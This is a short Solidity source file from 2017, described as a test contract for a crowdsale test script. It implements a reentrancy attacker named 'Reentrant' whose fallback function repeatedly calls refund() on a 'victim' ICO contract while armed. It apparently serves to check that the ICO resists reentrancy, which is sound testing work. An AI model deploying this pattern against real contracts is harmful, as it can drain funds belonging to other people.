pragma solidity 0.4.14;

// -----------------------------------------------------------------------------
// A contract used in the test-crowdsale.js script.
// Copyright (c) 2017 Pembient, Inc.
// The MIT License.
// -----------------------------------------------------------------------------

import "browser/PembiCoinICO.sol"; // in Remix (Solidity IDE)

contract Reentrant {

    PembiCoinICO public victim;
    bool public attack = false;

    function Reentrant(PembiCoinICO _victim) public {
        victim = _victim;
    }

    function arm() public {
        // cannot use transfer() due to fixed gas stipend
        // see also: https://github.com/ethereum/cpp-ethereum/issues/2368
        //victim.transfer(this.balance);
        victim.call.value(this.balance)();
        attack = true;
    }

    function disarm() public { attack = false; }

    function requestRefund() public { victim.refund(); }

    function() public payable {
        if (attack) { victim.refund(); }
    }
}
